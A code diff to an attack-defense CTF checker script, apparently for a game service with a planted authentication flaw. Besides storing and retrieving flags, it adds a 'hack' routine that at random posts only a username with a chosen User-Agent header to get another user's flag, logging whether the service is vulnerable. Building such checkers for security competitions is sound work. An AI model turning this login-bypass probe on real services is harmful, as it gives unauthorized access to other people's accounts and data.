@@ -3,6 +3,8 @@ import json
 import logging
 import random
 import string
+import time
+
 import requests
 
 import sys
@@ -11,6 +13,8 @@ import traceback
 OK, CORRUPT, MUMBLE, DOWN, CHECKER_ERROR = 101, 102, 103, 104, 110
 
 PORT = 8080
+HACK_PROBABILITY = 10
+HACK_SLEEP = 3
 
 MAIN_COOKIE = "ctf"
 SIGN_COOKIE = "ctf.sig"
@@ -58,6 +62,8 @@ def put(host, flag_id, flag, vuln):
     user = random_str(8)
     password = random_str(12)
 
+    logging.info("Registering %r with password %r ...", user, password)
+
     data = {
         "user": user,
         "password": password,
@@ -88,13 +94,17 @@ def get(host, flag_id, flag, vuln):
     user = json_flag_id["public_flag_id"]
     password = json_flag_id["password"]
 
+    if random.randint(0, HACK_PROBABILITY) == 0:
+        hack(host, user)
+        time.sleep(3)
+
     data = {
         "user": user,
         "password": password,
         "login": "Login",
     }
 
-    logging.info("Logging in ...")
+    logging.info("Logging in as %r ...", user)
     response = requests.post(url, data, allow_redirects=False)
     response.raise_for_status()
 
@@ -112,10 +122,10 @@ def get(host, flag_id, flag, vuln):
     logging.debug("Response cookies: %s ...", dict(cookies))
 
     if MAIN_COOKIE not in response.cookies:
-        verdict(MUMBLE, "Cookie %q not set".format(MAIN_COOKIE))
+        verdict(MUMBLE, "Cookie %r not set".format(MAIN_COOKIE))
 
     if SIGN_COOKIE not in response.cookies:
-        verdict(MUMBLE, "Cookie %q not set".format(SIGN_COOKIE))
+        verdict(MUMBLE, "Cookie %r not set".format(SIGN_COOKIE))
 
     logging.info("Getting user data ...")
     response = requests.get(url, cookies=cookies)
@@ -128,6 +138,35 @@ def get(host, flag_id, flag, vuln):
         verdict(CORRUPT, "Flag not found")
 
 
+def hack(host, user):
+    url = "http://{}:{}/".format(host, PORT)
+    logging.debug("URL: %s", url)
+
+    logging.info("Hacking user %r ...", user)
+
+    data = {
+        "user": user,
+    }
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/537.36",
+    }
+    response = requests.post(url, data, headers=headers)
+    if response.status_code != 200:
+        logging.info("Hack response code %r. Service is NOT vulnerable.", response.status_code)
+        return
+
+    flag = False
+    for line in response.text.split("\n"):
+        if "Flag:" in line:
+            flag = True
+            continue
+        if flag:
+            logging.info("Found flag: %r! Service is vulnerable.", line.strip())
+            return
+
+    logging.info("Flag not found. Service is NOT vulnerable.")
+
+
 def main(args):
     logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(message)s")
 
@@ -136,6 +175,7 @@ def main(args):
         "check":    (check, 1),
         "put":      (put, 4),
         "get":      (get, 4),
+        "hack":     (hack, 2),
     }
 
     if not args:
